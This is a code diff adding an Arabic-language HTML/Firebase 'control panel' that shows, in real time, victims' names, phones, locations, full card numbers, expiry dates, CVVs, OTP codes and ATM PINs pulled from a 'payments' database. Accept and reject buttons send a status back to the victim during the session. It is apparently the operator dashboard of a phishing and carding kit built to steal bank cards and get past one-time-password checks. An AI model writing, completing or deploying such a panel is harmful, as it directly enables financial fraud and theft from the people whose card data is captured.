@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة التحكم - المملكة العربية السعودية</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f4f7f6; margin: 0; padding: 0; }
+        .navbar { background: #006C35; padding: 15px; display: flex; justify-content: center; gap: 10px; position: sticky; top: 0; z-index: 1000; }
+        .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; flex: 1; max-width: 200px; font-size: 14px; }
+        .nav-btn.active { background: #ffffff; color: #006C35; }
+        
+        .container { padding: 15px; max-width: 100%; margin: auto; }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+
+        /* كروت المعلومات الشخصية */
+        .booking-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 15px; }
+        .customer-card { background: white; border-radius: 12px; padding: 20px; border-right: 8px solid #006C35; box-shadow: 0 4px 10px rgba(0,0,0,0.05); position: relative; }
+        .time-tag { background: #e6f4ea; color: #006C35; padding: 4px 8px; border-radius: 5px; font-size: 11px; font-weight: bold; position: absolute; left: 15px; top: 20px; }
+
+        /* سطر العمليات (البطاقات) */
+        .operation-row { background: white; border-radius: 8px; padding: 10px 15px; margin-bottom: 10px; display: flex; align-items: center; gap: 10px; border: 1px solid #eee; width: 98%; margin: 10px auto; overflow-x: auto; }
+        .name-tag { min-width: 130px; font-weight: bold; text-align: right; font-size: 14px; }
+        .box { padding: 8px 12px; border-radius: 6px; text-align: center; font-size: 13px; font-weight: bold; border: 1px solid transparent; white-space: nowrap; }
+        .card-box { background: #fffcf0; border-color: #fcebb6; color: #856404; min-width: 180px; }
+        .cvv-box { background: #f0f7ff; border-color: #cce5ff; color: #004085; min-width: 110px; }
+        .otp-atm-box { background: #fff5f5; border-color: #ffdada; color: #a94442; min-width: 160px; }
+
+        .actions { display: flex; gap: 5px; margin-right: auto; }
+        .btn { border: none; border-radius: 4px; padding: 8px 15px; color: white; font-weight: bold; cursor: pointer; font-size: 12px; }
+        .btn-accept { background: #28a745; }
+        .btn-reject { background: #dc3545; }
+        .btn-delete { background: #6c757d; }
+    </style>
+</head>
+<body>
+
+<div class="navbar">
+    <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">👤 المعلومات الشخصية</button>
+    <button class="nav-btn" onclick="openTab(event, 'cardsSection')">💳 مراقبة العمليات</button>
+</div>
+
+<div class="container">
+    <div id="bookingSection" class="tab-content active">
+        <div id="bookingGrid" class="booking-grid"></div>
+    </div>
+
+    <div id="cardsSection" class="tab-content">
+        <div id="paymentsContainer"></div>
+    </div>
+</div>
+
+<script>
+    // --- إعدادات Firebase (استبدلها ببياناتك) ---
+    const firebaseConfig = {
+        apiKey: "YOUR_API_KEY",
+        authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+        databaseURL: "YOUR_DATABASE_URL",
+        projectId: "YOUR_PROJECT_ID",
+        storageBucket: "YOUR_PROJECT_ID.appspot.com",
+        messagingSenderId: "YOUR_SENDER_ID",
+        appId: "YOUR_APP_ID"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // وظيفة حساب الوقت المنقضي
+    function timeSince(date) {
+        var seconds = Math.floor((new Date() - date) / 1000);
+        var interval = seconds / 3600;
+        if (interval > 1) return "منذ " + Math.floor(interval) + " ساعة";
+        interval = seconds / 60;
+        if (interval > 1) return "منذ " + Math.floor(interval) + " دقيقة";
+        return "الآن";
+    }
+
+    // سحب البيانات الشخصية (Booking)
+    db.ref('bookings').on('value', (snapshot) => {
+        const grid = document.getElementById('bookingGrid');
+        grid.innerHTML = '';
+        snapshot.forEach((childSnapshot) => {
+            const data = childSnapshot.val();
+            const timeAgo = data.timestamp ? timeSince(new Date(data.timestamp)) : "غير معروف";
+            grid.innerHTML += `
+                <div class="customer-card">
+                    <span class="time-tag">${timeAgo} 🕒</span>
+                    <h3>${data.name || 'بدون اسم'} 👤</h3>
+                    <p>📞 الهاتف: ${data.phone || '-'}</p>
+                    <p>🛠 الخدمة: ${data.service || '-'}</p>
+                    <p>⏰ الساعة: ${data.time || '-'}</p>
+                    <p>📍 الموقع: ${data.location || '-'}</p>
+                </div>`;
+        });
+    });
+
+    // سحب بيانات البطاقات والعمليات
+    db.ref('payments').on('value', (snapshot) => {
+        const container = document.getElementById('paymentsContainer');
+        container.innerHTML = '';
+        snapshot.forEach((childSnapshot) => {
+            const data = childSnapshot.val();
+            const id = childSnapshot.key;
+            container.innerHTML += `
+                <div class="operation-row">
+                    <div class="name-tag">${data.name || 'عميل'}</div>
+                    <div class="box card-box">${data.cardNumber || '---- ---- ---- ----'}</div>
+                    <div class="box cvv-box">${data.exp || '--/--'} | ${data.cvv || '---'}</div>
+                    <div class="box otp-atm-box">OTP: ${data.otp || '....'} | ATM: ${data.atm || '....'}</div>
+                    <div class="actions">
+                        <button class="btn btn-accept" onclick="updateStatus('${id}', 'accepted')">قبول</button>
+                        <button class="btn btn-reject" onclick="updateStatus('${id}', 'rejected')">رفض</button>
+                        <button class="btn btn-delete" onclick="deleteEntry('${id}')">🗑</button>
+                    </div>
+                </div>`;
+        });
+    });
+
+    // تحديث الحالة (Reaction) للعميل
+    function updateStatus(id, status) {
+        db.ref('payments/' + id).update({ status: status })
+        .then(() => alert('تم إرسال الرد للعميل'));
+    }
+
+    // حذف عملية
+    function deleteEntry(id) {
+        if(confirm('هل تريد حذف هذه البيانات؟')) db.ref('payments/' + id).remove();
+    }
+
+    // التنقل بين الأقسام
+    function openTab(evt, tabName) {
+        var i, tabcontent, navbtns;
+        tabcontent = document.getElementsByClassName("tab-content");
+        for (i = 0; i < tabcontent.length; i++) { tabcontent[i].style.display = "none"; }
+        navbtns = document.getElementsByClassName("nav-btn");
+        for (i = 0; i < navbtns.length; i++) { navbtns[i].className = navbtns[i].className.replace(" active", ""); }
+        document.getElementById(tabName).style.display = "block";
+        evt.currentTarget.className += " active";
+    }
+</script>
+</body>
+</html>
